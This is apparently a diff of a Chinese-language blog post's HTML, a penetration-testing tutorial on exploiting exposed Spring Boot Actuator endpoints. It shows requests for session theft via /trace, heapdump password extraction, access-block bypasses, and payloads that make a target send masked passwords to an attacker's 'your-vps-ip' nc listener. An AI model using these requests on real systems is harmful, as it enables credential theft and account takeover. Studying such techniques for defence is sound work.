@@ -9,8 +9,7 @@
   <title>Spring Bootp平台攻击手法 | Jici&#39;s Blog</title>
   <meta name="author" content="Jici">
   
-  <meta name="description" content="Spring Boot 端点Fuzz技巧
-一些开发者会修改Spring根路径/管理端点名称，比如：
+  <meta name="description" content="Spring Boot 端点Fuzz技巧一些开发者会修改Spring根路径/管理端点名称，比如：
 
 /manage
 /management
@@ -166,8 +165,7 @@ var _hmt = _hmt || [];
 	<div class="mypage">		
 	  		
 
-	  <h1>Spring Boot 端点Fuzz技巧</h1>
-<p>一些开发者会修改Spring根路径/管理端点名称，比如：</p>
+	  <h1 id="Spring-Boot-端点Fuzz技巧"><a href="#Spring-Boot-端点Fuzz技巧" class="headerlink" title="Spring Boot 端点Fuzz技巧"></a>Spring Boot 端点Fuzz技巧</h1><p>一些开发者会修改Spring根路径/管理端点名称，比如：</p>
 <ul>
 <li>/manage</li>
 <li>/management</li>
@@ -179,7 +177,7 @@ var _hmt = _hmt || [];
 <li>/env =&gt; /appenv</li>
 <li>/health =&gt; /healthcheck</li>
 </ul>
-<p>一般来讲，<mark>暴露出 Spring boot 应用的相关接口和传参信息</mark>并不能算是漏洞，但是以 “默认安全” 来讲，不暴露出这些信息更加安全。对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解。下面就列举一些相关的路由：</p>
+<p>一般来讲，==暴露出 Spring boot 应用的相关接口和传参信息==并不能算是漏洞，但是以 “默认安全” 来讲，不暴露出这些信息更加安全。对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解。下面就列举一些相关的路由：</p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;v2&#x2F;api-docs
 &#x2F;swagger-ui.html
 &#x2F;swagger
@@ -261,13 +259,10 @@ var _hmt = _hmt || [];
 &#x2F;actuator&#x2F;mappings
 &#x2F;actuator&#x2F;jolokia
 &#x2F;actuator&#x2F;hystrix.stream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h1>Spring Boot 端点敏感信息泄露</h1>
-<p>如果开发者没做端点保护/端点保护不严格，就可能导致端点敏感信息泄露</p>
-<h2 id="概述">概述</h2>
-<p>这里概述一下寻找漏洞比较重要端点：</p>
+<h1 id="Spring-Boot-端点敏感信息泄露"><a href="#Spring-Boot-端点敏感信息泄露" class="headerlink" title="Spring Boot 端点敏感信息泄露"></a>Spring Boot 端点敏感信息泄露</h1><p>如果开发者没做端点保护/端点保护不严格，就可能导致端点敏感信息泄露</p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>这里概述一下寻找漏洞比较重要端点：</p>
 <ul>
-<li>
-<p>/env、/actuator/env【GET】：</p>
+<li><p>/env、/actuator/env【GET】：</p>
 <ul>
 <li>请求 /env 会直接泄露环境变量、内网地址、配置中的用户名等信息</li>
 <li>当开发者的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文</li>
@@ -275,31 +270,25 @@ var _hmt = _hmt || [];
 <li>有概率获得星号遮掩的密码、密钥等重要隐私信息的明文</li>
 </ul>
 </li>
-<li>
-<p>/refresh、/actuator/refresh【POST】：请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh接口刷新属性变量来触发相关 RCE 漏洞</p>
+<li><p>/refresh、/actuator/refresh【POST】：请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh接口刷新属性变量来触发相关 RCE 漏洞</p>
 </li>
-<li>
-<p>/restart、/actuator/restart【POST】：暴露出此接口的情况较少，可以配合 POST 请求 /env 接口设置属性后，再 POST 请求 /restart 接口重启应用来触发相关 RCE 漏洞</p>
+<li><p>/restart、/actuator/restart【POST】：暴露出此接口的情况较少，可以配合 POST 请求 /env 接口设置属性后，再 POST 请求 /restart 接口重启应用来触发相关 RCE 漏洞</p>
 </li>
-<li>
-<p>/shutdown、/actuator/shutdown【POST】：用来关闭应用程序，这个端点一般不开放，一般也不会去测试，扫描器更加不可能将这个列为扫描端点（万一真的暴露了这个端点，扫到了就直接把业务程序关闭了）。这里讲一个判定技巧：<mark>这个端点只有使用POST请求的时候才会触发关闭，如果存在这个端点，可以先尝试GET请求，出现&quot;Method Not Allowed&quot;的字样则说明是存在的</mark></p>
+<li><p>/shutdown、/actuator/shutdown【POST】：用来关闭应用程序，这个端点一般不开放，一般也不会去测试，扫描器更加不可能将这个列为扫描端点（万一真的暴露了这个端点，扫到了就直接把业务程序关闭了）。这里讲一个判定技巧：==这个端点只有使用POST请求的时候才会触发关闭，如果存在这个端点，可以先尝试GET请求，出现”Method Not Allowed”的字样则说明是存在的==</p>
 <p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240409115004629.png" alt="image-20240409115004629"></p>
 <blockquote>
 <p>shutdown端点默认是关闭的。可以在application.properties中配置management.endpoint.shutdown.enabled=true来启用该端点</p>
 </blockquote>
 <p>下面通过视频演示访问shutdown端点，体会关闭应用程序的危险性</p>
-<p><video src="shutdown关闭应用程序.mp4"controls></video></video></p>
+<video src="shutdown关闭应用程序.mp4"controls></video></video>
 </li>
-<li>
-<p>/jolokia、/actuator/jolokia：可以通过 /jolokia/list接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等</p>
+<li><p>/jolokia、/actuator/jolokia：可以通过 /jolokia/list接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等</p>
 </li>
-<li>
-<p>/trace、/actuator/httptrace：一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情，以及有效用户或管理员的 session、cookie、jwt token 等信息</p>
+<li><p>/trace、/actuator/httptrace：一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情，以及有效用户或管理员的 session、cookie、jwt token 等信息</p>
 </li>
 </ul>
 <p>下面展开来讲</p>
-<h2 id="trace-泄露用户请求信息">trace 泄露用户请求信息</h2>
-<p>此端点允许查看 HTTP 请求和响应的跟踪信息，包括请求和响应的头部、参数等。</p>
+<h2 id="trace-泄露用户请求信息"><a href="#trace-泄露用户请求信息" class="headerlink" title="trace 泄露用户请求信息"></a>trace 泄露用户请求信息</h2><p>此端点允许查看 HTTP 请求和响应的跟踪信息，包括请求和响应的头部、参数等。</p>
 <pre class="line-numbers language-none"><code class="language-none"># Spring Boot 2.x
 http:&#x2F;&#x2F;127.0.0.1:8200&#x2F;actuator&#x2F;trace
 # Spring Boot 1.x
@@ -309,52 +298,44 @@ http:&#x2F;&#x2F;127.0.0.1:8200&#x2F;httptrace
 http:&#x2F;&#x2F;127.0.0.1:8200&#x2F;actuator&#x2F;httptrace<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>通过这个我们可以获取到请求这个站点时的完整的http包，其中就可能包括正常用户的session，从而导致我们可以直接接管登录，如果遇到管理员的会话，那么危害就可能进一步扩大。</p>
 <p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408211548652.png" alt="image-20240408211548652"></p>
-<h2 id="mappings-泄露路由信息">mappings 泄露路由信息</h2>
-<p>该端点用于描述全部的 URI 路径，以及和控制器的映射关系</p>
+<h2 id="mappings-泄露路由信息"><a href="#mappings-泄露路由信息" class="headerlink" title="mappings 泄露路由信息"></a>mappings 泄露路由信息</h2><p>该端点用于描述全部的 URI 路径，以及和控制器的映射关系</p>
 <pre class="line-numbers language-none"><code class="language-none"># Spring Boot 2.x
 http:&#x2F;&#x2F;127.0.0.1:8100&#x2F;actuator&#x2F;mappings
 # Spring Boot 1.x
 http:&#x2F;&#x2F;127.0.0.1:8200&#x2F;mappings<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 <p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408213513262.png" alt="image-20240408213513262"></p>
-<h2 id="heapdump-泄露堆栈信息">heapdump 泄露堆栈信息</h2>
-<p>HeapDump文件是JVM虚拟机运行时内存的一个快照，通常用于性能分析等，但是因为其保存了对象、类等相关的信息，如果被泄露也会造成信息泄露。HeapDump文件会通过/heapdump端点暴露出来（可以通过/heapdump端点下载heapdump文件，泄露JAVA堆栈信息）</p>
+<h2 id="heapdump-泄露堆栈信息"><a href="#heapdump-泄露堆栈信息" class="headerlink" title="heapdump 泄露堆栈信息"></a>heapdump 泄露堆栈信息</h2><p>HeapDump文件是JVM虚拟机运行时内存的一个快照，通常用于性能分析等，但是因为其保存了对象、类等相关的信息，如果被泄露也会造成信息泄露。HeapDump文件会通过/heapdump端点暴露出来（可以通过/heapdump端点下载heapdump文件，泄露JAVA堆栈信息）</p>
 <pre class="line-numbers language-none"><code class="language-none"># Spring Boot 2.x
 http:&#x2F;&#x2F;127.0.0.1:8100&#x2F;heapdump
 # Spring Boot 1.x
 http:&#x2F;&#x2F;127.0.0.1:8200&#x2F;actuator&#x2F;heapdump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><mark>其中可以窃取到一些关键的信息，比如一些关键的Key，或者数据库连接密码</mark>，但是大多扫描工具没把它列为扫描端点。</p>
+<p>==其中可以窃取到一些关键的信息，比如一些关键的Key，或者数据库连接密码==，但是大多扫描工具没把它列为扫描端点。</p>
 <p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408214811816.png" alt="image-20240408214811816"></p>
-<h3 id="使用Eclipse-Memory-Analyzer获取">使用Eclipse Memory Analyzer获取</h3>
-<p>通过这个端点下载HeapDump文件后，我们可以用&quot;Eclipse Memory Analyzer&quot;内存分析工具，来搜索特殊字符，比如password、token等。</p>
+<h3 id="使用Eclipse-Memory-Analyzer获取"><a href="#使用Eclipse-Memory-Analyzer获取" class="headerlink" title="使用Eclipse Memory Analyzer获取"></a>使用Eclipse Memory Analyzer获取</h3><p>通过这个端点下载HeapDump文件后，我们可以用”Eclipse Memory Analyzer”内存分析工具，来搜索特殊字符，比如password、token等。</p>
 <pre class="line-numbers language-none"><code class="language-none">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))
 
 select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408214949651.png" alt="image-20240408214949651"></p>
-<h3 id="使用Java-VisualVM获取">使用Java VisualVM获取</h3>
-<p>除了&quot;Eclipse Memory Analyzer&quot;内存分析工具之外，还可以使用一款<mark>在安装了JDK6U7及以上版本会自动安装的名为&quot;Java VisualVM&quot;的工具</mark>。Java VisualVM的路径在JDK安装目录下的bin文件夹中，程序名为<code>jvisualvm.exe</code>，双击启动即可（或者在cmd命令行中直接输入<code>jvisualvm</code>）</p>
+<h3 id="使用Java-VisualVM获取"><a href="#使用Java-VisualVM获取" class="headerlink" title="使用Java VisualVM获取"></a>使用Java VisualVM获取</h3><p>除了”Eclipse Memory Analyzer”内存分析工具之外，还可以使用一款==在安装了JDK6U7及以上版本会自动安装的名为”Java VisualVM”的工具==。Java VisualVM的路径在JDK安装目录下的bin文件夹中，程序名为<code>jvisualvm.exe</code>，双击启动即可（或者在cmd命令行中直接输入<code>jvisualvm</code>）</p>
 <p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408215433813.png" alt="image-20240408215433813"></p>
 <p>之后导入下载到的HeapDump文件，打开QOL控制台</p>
 <p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408215600998.png" alt="image-20240408215600998"></p>
 <p>在查询编辑器输入查询语句即可</p>
 <p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408215648584.png" alt="image-20240408215648584"></p>
 <p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408215700248.png" alt="image-20240408215700248"></p>
-<h3 id="使用jhat获取">使用jhat获取</h3>
-<p>jhat也是jdk自带的用于分析JVM heapdump文件的工具。</p>
+<h3 id="使用jhat获取"><a href="#使用jhat获取" class="headerlink" title="使用jhat获取"></a>使用jhat获取</h3><p>jhat也是jdk自带的用于分析JVM heapdump文件的工具。</p>
 <pre class="line-numbers language-none"><code class="language-none">jhat -J-mx512M heapdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>执行过后会在本地启动一个端口7000的http服务，进行访问后利用搜索关键词依次查找即可</p>
 <p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240412141736963.png" alt="image-20240412141736963"></p>
 <p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240412141804158.png" alt="image-20240412141804158"></p>
-<h3 id="使用JDumpSpider获取">使用JDumpSpider获取</h3>
-<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></p>
+<h3 id="使用JDumpSpider获取"><a href="#使用JDumpSpider获取" class="headerlink" title="使用JDumpSpider获取"></a>使用JDumpSpider获取</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></p>
 <blockquote>
 <p>此工具需要使用Java 1.6或更高版本</p>
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="使用heapdump-tool获取">使用heapdump_tool获取</h3>
-<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a></p>
+<h3 id="使用heapdump-tool获取"><a href="#使用heapdump-tool获取" class="headerlink" title="使用heapdump_tool获取"></a>使用heapdump_tool获取</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/wyzxxz/heapdump_tool">https://github.com/wyzxxz/heapdump_tool</a></p>
 <pre class="line-numbers language-none"><code class="language-none">java -jar heapdump_tool.jar heapdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="env-泄露配置信息">env 泄露配置信息</h2>
-<p>这个端点会泄露系统版本、环境变量、内网地址等信息（甚至可能直接导致数据库密码泄露）</p>
+<h2 id="env-泄露配置信息"><a href="#env-泄露配置信息" class="headerlink" title="env 泄露配置信息"></a>env 泄露配置信息</h2><p>这个端点会泄露系统版本、环境变量、内网地址等信息（甚至可能直接导致数据库密码泄露）</p>
 <pre class="line-numbers language-none"><code class="language-none"># Spring Boot 2.x
 http:&#x2F;&#x2F;127.0.0.1:8100&#x2F;actuator&#x2F;env
 # Spring Boot 1.x
@@ -363,52 +344,35 @@ http:&#x2F;&#x2F;127.0.0.1:8200&#x2F;env<span aria-hidden="true" class="line-num
 <p>但是一些敏感信息会被关键词匹配，做隐藏*处理（即星号脱敏）</p>
 </blockquote>
 <p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240408210924233.png" alt="image-20240408210924233"></p>
-<p>当遇到访问 /actuator 可以访问，但再<mark>访问如 /env 的时候被拦截</mark>，这个时候可以尝试以下方法：</p>
+<p>当遇到访问 /actuator 可以访问，但再==访问如 /env 的时候被拦截==，这个时候可以尝试以下方法：</p>
 <ul>
-<li>
-<p>更换请求方法</p>
+<li><p>更换请求方法</p>
 </li>
-<li>
-<p>/actuator;/env;</p>
+<li><p>/actuator;/env;</p>
 </li>
-<li>
-<p>/actuator/; /env</p>
-</li>
-<li>
-<p>Content-Type改为application/json</p>
-</li>
-<li>
-<p>大数据包绕过</p>
-</li>
+<li>/actuator/; /env</li>
+<li>Content-Type改为application/json</li>
+<li>大数据包绕过</li>
 </ul>
 <p>下面再讲讲如何绕过星号脱敏</p>
-<h3 id="绕过星号脱敏">绕过星号脱敏</h3>
-<p>方法1：</p>
+<h3 id="绕过星号脱敏"><a href="#绕过星号脱敏" class="headerlink" title="绕过星号脱敏"></a>绕过星号脱敏</h3><p>方法1：</p>
 <ul>
-<li>
-<p>利用条件</p>
+<li><p>利用条件</p>
 <ul>
-<li>
-<p>目标网站存在 /jolokia或 /actuator/jolokia接口</p>
-<ul>
-<li>目标使用了 jolokia-core依赖</li>
+<li>目标网站存在 /jolokia或 /actuator/jolokia接口</li>
 </ul>
 </li>
 </ul>
-</li>
-<li>
-<p>利用方法</p>
+<pre><code>- 目标使用了 jolokia-core依赖
+</code></pre><ul>
+<li><p>利用方法</p>
 <ol>
-<li>
-<p>找到想要获取的属性名：GET 请求目标网站的 <code>/env</code>或 <code>/actuator/env</code>接口，搜索 <code>******</code>关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名</p>
+<li><p>找到想要获取的属性名：GET 请求目标网站的 <code>/env</code>或 <code>/actuator/env</code>接口，搜索 <code>******</code>关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名</p>
 <p><img src="/2024/04/08/Spring-Bootp%E5%B9%B3%E5%8F%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/image-20240410095550816.png" alt="image-20240410095550816"></p>
 </li>
-<li>
-<p>jolokia 调用相关 Mbean 获取明文：</p>
-</li>
-</ol>
+<li><p>jolokia 调用相关 Mbean 获取明文：</p>
 <p>将下面示例中的 security.user.password替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 <code>value</code>键中</p>
-   <pre class="line-numbers language-none"><code class="language-none"># Spring Boot 1.x
+<pre class="line-numbers language-none"><code class="language-none"># Spring Boot 1.x
 POST &#x2F;jolokia
 Content-Type: application&#x2F;json
 
@@ -422,7 +386,7 @@ Content-Type: application&#x2F;json
 <blockquote>
 <p>调用 org.springframework.bootMbean。实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法。</p>
 </blockquote>
-   <pre class="line-numbers language-none"><code class="language-none"># Spring Boot 1.x
+<pre class="line-numbers language-none"><code class="language-none"># Spring Boot 1.x
 POST &#x2F;jolokia
 Content-Type: application&#x2F;json
 
@@ -438,41 +402,33 @@ Content-Type: application&#x2F;json
 </blockquote>
 <p>或者调用其他 Mbean，因为目标具体存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。</p>
 </li>
+</ol>
+</li>
 </ul>
 <p>方法2：</p>
 <ul>
-<li>
-<p>利用条件</p>
+<li><p>利用条件</p>
 <ul>
-<li>
-<p>可以 GET 请求目标网站的 /env</p>
+<li><p>可以 GET 请求目标网站的 /env</p>
 </li>
-<li>
-<p>可以 POST 请求目标网站的 /env</p>
+<li><p>可以 POST 请求目标网站的 /env</p>
 </li>
-<li>
-<p>可以 POST 请求目标网站的 /refresh接口刷新配置（存在 spring-boot-starter-actuator依赖）</p>
-</li>
-<li>
-<p>目标使用了 spring-cloud-starter-netflix-eureka-client依赖</p>
-</li>
-<li>
-<p>目标可以请求攻击者的服务器（请求可出外网）</p>
-</li>
+<li>可以 POST 请求目标网站的 /refresh接口刷新配置（存在 spring-boot-starter-actuator依赖）</li>
+<li>目标使用了 spring-cloud-starter-netflix-eureka-client依赖</li>
+<li>目标可以请求攻击者的服务器（请求可出外网）</li>
 </ul>
 </li>
-<li>
-<p>利用方法</p>
+</ul>
+<ul>
+<li>利用方法</li>
+</ul>
 <ol>
-<li>
-<p>找到想要获取的属性名：GET 请求目标网站的 <code>/env</code>或 <code>/actuator/env</code>接口，搜索 <code>******</code>关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
+<li><p>找到想要获取的属性名：GET 请求目标网站的 <code>/env</code>或 <code>/actuator/env</code>接口，搜索 <code>******</code>关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
 </li>
-<li>
-<p>使用 nc 监听 HTTP 请求：在自己控制的外网服务器上监听 80 端口。如下</p>
+<li><p>使用 nc 监听 HTTP 请求：在自己控制的外网服务器上监听 80 端口。如下</p>
 <pre class="line-numbers language-none"><code class="language-none">nc -lvk 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </li>
-<li>
-<p>设置 eureka.client.serviceUrl.defaultZone 属性：将下面 <code>http://value:$&#123;security.user.password&#125;@your-vps-ip</code>中的 <code>security.user.password</code>换成自己想要获取的对应的星号 * 遮掩的属性名</p>
+<li><p>设置 eureka.client.serviceUrl.defaultZone 属性：将下面 <code>http://value:$&#123;security.user.password&#125;@your-vps-ip</code>中的 <code>security.user.password</code>换成自己想要获取的对应的星号 * 遮掩的属性名</p>
 <pre class="line-numbers language-none"><code class="language-none"># Spring Boot 1.x
 POST &#x2F;env
 Content-Type: application&#x2F;x-www-form-urlencoded
@@ -485,8 +441,7 @@ Content-Type: application&#x2F;json
 
 &#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;value:$&#123;security.user.password&#125;@your-vps-ip&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 </li>
-<li>
-<p>刷新配置：</p>
+<li><p>刷新配置：</p>
 <pre class="line-numbers language-none"><code class="language-none"># Spring Boot 1.x
 POST &#x2F;refresh
 Content-Type: application&#x2F;x-www-form-urlencoded
@@ -495,35 +450,27 @@ Content-Type: application&#x2F;x-www-form-urlencoded
 POST &#x2F;actuator&#x2F;refresh
 Content-Type: application&#x2F;json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 </li>
-<li>
-<p>解码属性值：正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code>头内容</p>
+<li><p>解码属性值：正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code>头内容</p>
 <pre class="line-numbers language-none"><code class="language-none">Authorization: Basic dmFsdWU6MTIzNDU2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code>value:123456</code>，其中的 <code>123456</code>即是目标星号 * 脱敏前的属性值明文。</p>
 </li>
 </ol>
-</li>
-</ul>
 <p>方法3：</p>
 <ul>
-<li>
-<p>利用条件</p>
+<li><p>利用条件</p>
 <ul>
 <li>通过 POST /env设置属性触发目标对外网指定地址发起任意 http 请求</li>
 <li>目标可以请求攻击者的服务器（请求可出外网）</li>
 </ul>
 </li>
-<li>
-<p>利用方法</p>
+<li><p>利用方法</p>
 <ol>
-<li>
-<p>找到想要获取的属性名：GET 请求目标网站的 <code>/env</code>或 <code>/actuator/env</code>接口，搜索 <code>******</code>关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
+<li><p>找到想要获取的属性名：GET 请求目标网站的 <code>/env</code>或 <code>/actuator/env</code>接口，搜索 <code>******</code>关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
 </li>
-<li>
-<p>使用 nc 监听 HTTP 请求：在自己控制的外网服务器上监听 80 端口</p>
+<li><p>使用 nc 监听 HTTP 请求：在自己控制的外网服务器上监听 80 端口</p>
 <pre class="line-numbers language-none"><code class="language-none">nc -lvk 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </li>
-<li>
-<p>触发对外 http 请求：</p>
+<li><p>触发对外 http 请求：</p>
 <pre class="line-numbers language-none"><code class="language-none"># 使用spring.cloud.bootstrap.location方法（同时适用于明文数据中有特殊 url 字符的情况）
 # Spring Boot 1.x
 POST &#x2F;env
@@ -550,8 +497,7 @@ Content-Type: application&#x2F;json
 
 &#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;$&#123;security.user.password&#125;&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 </li>
-<li>
-<p>刷新配置：</p>
+<li><p>刷新配置：</p>
 <pre class="line-numbers language-none"><code class="language-none"># Spring Boot 1.x
 POST &#x2F;refresh
 Content-Type: application&#x2F;x-www-form-urlencoded
@@ -565,29 +511,23 @@ Content-Type: application&#x2F;json<span aria-hidden="true" class="line-numbers-
 </ul>
 <p>方法4：</p>
 <ul>
-<li>
-<p>说明：<mark>这种方法就是利用 /heapdump 端点泄露堆栈信息从而获取星号脱敏的敏感信息明文</mark></p>
+<li><p>说明：==这种方法就是利用 /heapdump 端点泄露堆栈信息从而获取星号脱敏的敏感信息明文==</p>
 </li>
-<li>
-<p>利用条件</p>
+<li><p>利用条件</p>
 <ul>
 <li>可正常 GET 请求目标 /heapdump或 /actuator/heapdump端点</li>
 </ul>
 </li>
-<li>
-<p>利用方法（和 /heapdump 端点泄露堆栈信息相同）</p>
+<li><p>利用方法（和 /heapdump 端点泄露堆栈信息相同）</p>
 <ol>
-<li>
-<p>找到想要获取的属性名：GET 请求目标网站的 <code>/env</code>或 <code>/actuator/env</code>接口，搜索 <code>******</code>关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
+<li><p>找到想要获取的属性名：GET 请求目标网站的 <code>/env</code>或 <code>/actuator/env</code>接口，搜索 <code>******</code>关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p>
 </li>
-<li>
-<p>下载Heapdump文件：<code>GET</code>请求目标的 <code>/heapdump</code>或 <code>/actuator/heapdump</code>接口，下载应用实时的 JVM 堆栈信息</p>
+<li><p>下载Heapdump文件：<code>GET</code>请求目标的 <code>/heapdump</code>或 <code>/actuator/heapdump</code>接口，下载应用实时的 JVM 堆栈信息</p>
 <blockquote>
 <p>下载的 Heapdump 文件大小通常在 50M~500M 之间，有时候也可能会大于 2G</p>
 </blockquote>
 </li>
-<li>
-<p>加载Heapdump文件，使用<code>Eclipse Memory Analyzer</code>、<code>Java VisualVM</code>等软件加载Heapdump文件，通过OQL语句搜索敏感信息（如：password）</p>
+<li><p>加载Heapdump文件，使用<code>Eclipse Memory Analyzer</code>、<code>Java VisualVM</code>等软件加载Heapdump文件，通过OQL语句搜索敏感信息（如：password）</p>
 <pre class="line-numbers language-none"><code class="language-none">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))
 
 或
@@ -601,14 +541,12 @@ select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&q
 </ol>
 </li>
 </ul>
-<h1>漏洞检测与利用工具</h1>
-<ul>
+<h1 id="漏洞检测与利用工具"><a href="#漏洞检测与利用工具" class="headerlink" title="漏洞检测与利用工具"></a>漏洞检测与利用工具</h1><ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/rabbitmask/SB-Actuator">SB-Actuator</a></li>
 <li><a target="_blank" rel="noopener" href="https://github.com/AabyssZG/SpringBoot-Scan">SB-Scan</a></li>
 <li><a target="_blank" rel="noopener" href="https://github.com/API-Security/APIKit">APIKit</a></li>
 </ul>
-<h1>鸣谢</h1>
-<ul>
+<h1 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h1><ul>
 <li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9763?time__1311=n4%2BxuDgD9AD%3DDtIYGNDQT4BK4iIKfSoqoSrD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-7">Spring Boot Actuator 未授权的测试与利用思路 - 先知社区 (aliyun.com)</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/271347.html">Spring Boot漏洞exploit利用方法渗透技巧汇总 - FreeBuf网络安全行业门户</a></li>
 <li><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_9652359/5508872">Spring Actuator信息泄露HeapDump_土豆笔记的技术博客_51CTO博客</a></li>
@@ -683,7 +621,7 @@ select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&q
 	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
 	   <div id="toc" class="toc collapse in">
 		   <span class="toc-title">Contents</span>
